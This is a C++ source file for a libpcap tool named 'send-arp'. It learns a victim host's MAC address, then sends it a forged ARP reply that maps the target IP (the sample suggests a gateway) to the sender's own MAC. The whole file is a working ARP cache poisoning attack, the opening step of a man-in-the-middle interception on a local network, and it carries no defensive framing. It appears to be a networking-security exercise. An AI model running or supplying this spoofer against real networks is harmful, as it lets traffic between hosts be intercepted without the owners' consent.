#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"
#include "mac.h"
#include <net/if.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>

//typedef uint8_t mac[6];
//typedef uint32_t ip;
#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip>");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1");
}

void getmac(char *dev, Mac *mac){
    struct ifreq ifr;
    int sockfd, ret;
    sockfd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    strcpy(ifr.ifr_name,dev);
    ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
    if(ret == 0){
        memcpy(mac,ifr.ifr_hwaddr.sa_data,Mac::SIZE);
    }else{
        printf("Fail ioctl \n");
        exit (1);
    }
    //printf("%.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", (unsigned char)ifr.ifr_hwaddr.sa_data[0], (unsigned char)ifr.ifr_hwaddr.sa_data[1], (unsigned char)ifr.ifr_hwaddr.sa_data[2], (unsigned char)ifr.ifr_hwaddr.sa_data[3], (unsigned char)ifr.ifr_hwaddr.sa_data[4], (unsigned char)ifr.ifr_hwaddr.sa_data[5]);
}
int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }
    char* dev = argv[1];
    Ip sen_IP =std::string(argv[2]);
    Ip tar_IP = std::string(argv[3]);
    Mac mac;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    //getmymac;
    getmac(dev , &mac);
    //getmyip
    char *my_ip;
    struct ifreq ifr;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    /* I want to get an IPv4 IP address */
    ifr.ifr_addr.sa_family = AF_INET;
    /* I want IP address attached to "eth0" */
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    int ret = (ioctl(sockfd, SIOCGIFADDR, &ifr));
    if( ret < 0){
        printf("ip_addr error\n");
        exit (1);
    }
    my_ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
    //printf("%s\n",my_ip);
    EthArpPacket packet;
    //broadcast
    packet.eth_.smac_ = mac;
    //memcpy(packet.eth_.smac_, mac , MAC_ALEN);
    memset(packet.eth_.dmac_,0xFF, Mac::SIZE);
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = mac;
    //memcpy(packet.arp_.smac_, mac, MAC_ALEN);
    packet.arp_.sip_ = htonl(Ip(my_ip));
    memset(packet.arp_.tmac_,0x00, Mac::SIZE);
    packet.arp_.tip_= htonl(Ip(sen_IP));

    //sendpacket
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    //reply
    while(true){
        struct pcap_pkthdr* header;
        const u_char* repacket;

        int res = pcap_next_ex(handle, &header, &repacket);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        struct EthArpPacket *rpacket = (struct EthArpPacket *)repacket;
        if(ntohs(rpacket->eth_.type_) != EthHdr::Arp) continue;
        if(packet.arp_.sip_ == rpacket->arp_.tip_ && packet.arp_.tip_ == rpacket->arp_.sip_){
            packet.eth_.dmac_ = rpacket->arp_.smac_;
            packet.arp_.tmac_ = rpacket->arp_.smac_;
            packet.eth_.dmac_ = rpacket->arp_.smac_;
            packet.arp_.tmac_ = rpacket->arp_.smac_;
            //memcpy(packet.eth_.dmac_, rpacket->arp_.smac_ ,MAC_ALEN);
            //memcpy(packet.arp_.tmac_, rpacket->arp_.smac_ ,MAC_ALEN);
            packet.arp_.op_=htons(ArpHdr::Reply);
            packet.arp_.sip_ = htonl(Ip(tar_IP));

            int reply = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
            if (reply != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", reply, pcap_geterr(handle));

                break;
            }
        }
    }
    pcap_close(handle);
}
